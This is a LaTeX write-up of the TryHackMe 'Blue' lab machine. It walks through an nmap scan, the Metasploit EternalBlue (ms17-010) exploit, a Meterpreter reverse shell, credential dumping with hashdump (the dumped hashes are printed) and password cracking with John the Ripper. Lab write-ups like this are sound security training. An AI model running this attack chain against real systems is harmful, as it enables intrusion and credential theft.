@@ -1,0 +1,163 @@
+\documentclass{article}
+\usepackage[utf8]{inputenc}
+\usepackage{fullpage}
+\usepackage{enumitem,amssymb}
+\usepackage{pifont}
+\newcommand{\cmark}{\ding{51}}%
+\newcommand{\xmark}{\ding{55}}%
+\newcommand{\done}{\rlap{$\square$}{\raisebox{2pt}{\large\hspace{1pt}\cmark}}%
+\hspace{-2.5pt}}
+\usepackage{listings}
+\usepackage[table,xcdraw]{xcolor}
+
+\title{CTF header}
+\author{kasperverhulst }
+\date{February 2021}
+
+\begin{document}
+
+\begin{table}[h]
+\def\arraystretch{1.8}
+\begin{tabular}{|llll|}
+\hline
+\multicolumn{4}{|c|}{\Large \textbf{Blue}}                                                                                         \\ \hline
+
+\multicolumn{2}{|p{0.4\textwidth}|}{Organization: TryHackMe}     &    \multicolumn{2}{|l|}{Type: VM}    \\ \hline
+\multicolumn{3}{|l|}{
+    \begin{minipage} [t] {0.07\textwidth} 
+Categories:
+    \end{minipage} 
+    \begin{minipage} [t] {0.3\textwidth} 
+      \begin{itemize}[label=$\square$]
+            \item Network Security
+            \item[\done] Cryptography
+            \item Mobile Applications
+            \item Linux
+     \end{itemize} 
+    \end{minipage} 
+     \begin{minipage} [t] {0.3\textwidth} 
+      \begin{itemize}[label=$\square$]
+            \item Reverse Engineering
+            \item Web Applications
+            \item Forensics
+            \item[\done] Windows
+        \end{itemize} 
+    \end{minipage} } 
+    & Difficulty: Easy \\ \hline 
+    \multicolumn{2}{|l|}{Name: Kasper Verhulst} & 
+    \multicolumn{2}{|l|}{\begin{tabular}[c]{@{}l@{}}Release date: 17-03-2019\\ Completing date: 21-04-2021 \end{tabular}} \\ \hline
+\end{tabular}
+\end{table}
+
+\section{Reconnaissance}
+As usual, we start exploring our machine with nmap. We want to:
+
+\begin{itemize}
+\item check for OS with flag -O
+\item check for port 1-1000
+\item determine which versions of the services is running with -sV
+\item use flag --script vul to find vulnerabilities
+\end{itemize}
+
+\begin{lstlisting}[language=bash, numbers=none,basicstyle=\ttfamily]
+$nmap -sS -O -p1-1000 -sV -v --script vuln 10.10.243.55
+\end{lstlisting}
+We see the machine is running:
+
+\begin{table}[h]
+\begin{tabular}{|l|l|l|}
+\hline
+\rowcolor[HTML]{9B9B9B} 
+\textbf{Port} & \textbf{Service} & \textbf{Version}                                             \\ \hline
+135/tcp open  & msrpc            & Microsoft Windows RPC                                        \\ \hline
+139/tcp open  & netbios-ssn      & Microsoft Windows netbios-ssn                                \\ \hline
+445/tcp open  & microsoft-ds     & Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP) \\ \hline
+\end{tabular}
+\end{table}
+It looks like the machine is definitely a Windows server. The machine seems to be running NetBIOS and a version of SMB that is vulnerable to \textit{ms17-010}.
+
+\section{Exploit}
+We use Metaspoit to exploit this bug. First, list the available exploits:
+
+\begin{lstlisting}
+$msfconsole search ms17-010
+\end{lstlisting}
+which learns us we can use \textit{exploit/windows/smb/ms17\_010\_eternalblue}. Find the configuration of the exploit running: 
+\begin{lstlisting}
+$msfconsole use exploit/windows/smb/ms17_010_eternalblue
+$msfconsole options
+$msfconsole set RHOSTS <BOX_IP>
+$msfconsle set LHOST <VPN_IP>
+$msfconsole run
+\end{lstlisting}
+
+We have access to the machine:
+
+\begin{quote}
+Microsoft Windows [Version 6.1.7601] \\
+Copyright (c) 2009 Microsoft Corporation. \\ All rights reserved.
+C:/Windows/system32 >
+\end{quote}
+By running $whoami$, you can see the we have access as the \textit{nt authority/system user}
+
+\section{Privilege Escalation}
+After we have access, we can replace our shell with Meterpreter WHY??. Background the current DOS shell with ctrl + Z. Select the Meterpreter exploit, check the required variables and run.
+
+\begin{lstlisting}
+$ search meterpreter
+$ use post/multi/manage/shell_to_meterpreter
+$ info
+$ sessions
+$ set SESSION 1
+$ run
+\end{lstlisting}
+This post exploit has openen a second reverse shell to the Windows box. Select the Meterpreter shell:
+
+\begin{lstlisting}
+$ sessions -l
+$ sessions 2
+\end{lstlisting}
+Now again have a reverse shell on the Windows box, but this time as meterpreter. Some more reconnsaissance:
+
+\begin{lstlisting}
+$ sysinfo
+\end{lstlisting}
+
+Computer        : JON-PC \\
+OS              : Windows 7 (6.1 Build 7601, Service Pack 1). \\
+Architecture    : x64 \\
+System Language : en\_US \\
+Domain          : WORKGROUP \\
+Logged On Users : 0 \\
+Meterpreter     : x64/windows \\
+
+Now we need to migrate to a process that will have enough privileges:
+
+\begin{lstlisting}
+$ getsystem
+$ hashdump
+\end{lstlisting}
+
+\begin{lstlisting}
+$ getpid
+$ ps
+$ migrate -N winlogon.exe
+\end{lstlisting}
+
+We can find the following credentials: \\
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: \\
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: \\
+Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d::: \\
+
+Windows stores still data under C:/windows/system32/config/SAM
+\section{Password cracking}
+After a bit of research, we can find Windows stores the passwords in the format User Name : RID: LM-HASH value : NT-HASH. You can see, the LM hash is the same for all three accounts. The string “aad3b435b51404eeaad3b435b51404ee” is the LM hash for ‘no password’. Maybe, the password is too long for LM or maybe this weak hashing scheme was disabled. Anyway we 'll have to look at the NT hash. We could for instance use Joh the Ripper.
+
+\begin{lstlisting}
+$john --format=NT passwords.txt
+$john --format=NT passwords.txt --show
+\end{lstlisting}
+
+\end{document}
+
+
